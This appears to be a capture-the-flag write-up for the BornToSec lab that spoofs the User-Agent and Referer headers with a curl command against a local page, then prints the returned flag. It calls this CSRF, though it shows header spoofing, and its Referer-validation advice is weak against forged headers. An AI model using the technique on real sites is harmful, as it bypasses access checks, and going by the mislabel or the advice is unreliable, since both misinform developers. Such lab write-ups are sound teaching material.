# Cross-Site Request Forgery Exploit

## Overview

By clicking on `© BornToSec` at the bottom of the main page which contains the link `http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`, you are redirected to another page.

Inspecting the source code reveals the following comments:

```html
<!-- You must come from : "https://www.nsa.gov/". -->
<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
```

These comments suggest that we should change the User-Agent to make it appear as though you are using a browser named `ft_bornToSec` and modify the Referer header to make it seem like you are coming from `https://www.nsa.gov/`.

## Executing the Exploit

To perform this exploit, you can use the provided script or manually enter the following `curl` command in your terminal:

```sh
curl --silent --user-agent 'ft_bornToSec' --referer "https://www.nsa.gov/" "http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep 'flag'
```

This command will return the following result:

```html
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

Therefore, the flag is: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Prevention

To prevent such exploits, it is important to implement security measures such as validating the Referer header. For detailed guidance, refer to the OWASP Cheat Sheet on Cross-Site Request Forgery (CSRF) Prevention: [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#identifying-source-origin-via-originreferer-header)
